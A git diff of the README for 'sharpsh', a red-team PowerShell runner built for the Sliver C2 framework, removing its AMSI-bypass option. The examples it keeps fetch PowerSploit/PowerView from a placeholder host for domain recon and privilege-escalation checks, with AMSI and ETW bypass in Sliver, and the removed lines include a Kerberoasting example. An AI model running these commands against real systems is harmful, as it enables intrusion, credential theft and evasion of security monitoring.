@@ -1,10 +1,9 @@
 # sharpsh
-C# .Net Framework program that uses `RunspaceFactory` for Powershell command execution.
+C# .Net Framework program that uses `RunspaceFactory` for Powershell command execution. Built for use with `execute-assembly -E -M -i ...` in [BishopFox/Sliver](https://github.com/bishopfox/sliver).
 
 ## Features
 - Execute Powershell commands
 - Load & execute remote script
-- AMSI Bypass
 - Multiple command & script support
 - Encoded command support
 - Load & execute script from clipboard
@@ -15,19 +14,17 @@ C# .Net Framework program that uses `RunspaceFactory` for Powershell command exe
 sharpsh 1.0.0.0
 Copyright c  2022
 
-  -c, --cmd            Required. Powershell command to run
+  -c, --cmd          Required. Powershell command to run
 
-  -u, --uri            Fetch script from URI
+  -u, --uri          Fetch script from URI
 
-  -p, --clipboard      Fetch script from clipboard
+  -p, --clipboard    Fetch script from clipboard
 
-  -b, --bypass-amsi    Bypass AMSI
+  -e, --encoded      Encodeded command (base64)
 
-  -e, --encoded        Encodeded command (base64)
+  --help             Display this help screen.
 
-  --help               Display this help screen.
-
-  --version            Display version information.
+  --version          Display version information.
 ```
 
 ## Examples
@@ -56,9 +53,6 @@ PS > .\sharpsh.exe -c get-netlocalgroup,invoke-privesccheck -u http://x.x.x.x/Po
 
 # sliver inline & bypass AMSI + ETW
 sliver > execute-assembly -M -E -i /tools/sharpsh.exe -c get-netlocalgroup -u http://x.x.x.x/psh/PowerSploit/Recon/PowerView.ps1
-
-# sliver BOF & bypass AMSI
-sliver > inline-execute-assembly /tools/sharpsh.exe '-b -c invoke-kerberoast -u http://x.x.x.x/PowerView.ps1'
 ```
 
 ## Planned
